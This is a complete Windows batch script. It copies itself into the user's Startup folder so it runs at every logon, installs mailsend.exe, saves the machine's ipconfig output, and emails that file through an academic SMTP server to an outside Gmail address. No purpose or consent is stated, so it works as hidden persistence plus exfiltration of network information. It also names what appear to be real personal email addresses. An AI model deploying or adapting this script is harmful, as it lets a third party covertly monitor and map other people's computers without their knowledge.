@echo off

if not exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%~nx0" (
  copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
)

if not exist C:\mailsend\ (
  if exist .\task\mailsend\mailsend.exe (
    mkdir C:\mailsend\
    copy .\task\mailsend\mailsend.exe C:\mailsend\
  ) else (
    echo "No mailsend.exe. Program halted."
    goto end
  )
) 

if exist C:\mailsend\ipconfig.txt del C:\mailsend\ipconfig.txt
ipconfig >> C:\mailsend\ipconfig.txt

C:\mailsend\mailsend.exe -f petrovk@ac-poitiers.fr -d ac-poitiers.fr -smtp smtp.ac-poitiers.fr -t www.hammerill@gmail.com -sub IPCONFIG -a C:\mailsend\ipconfig.txt

:end
pause
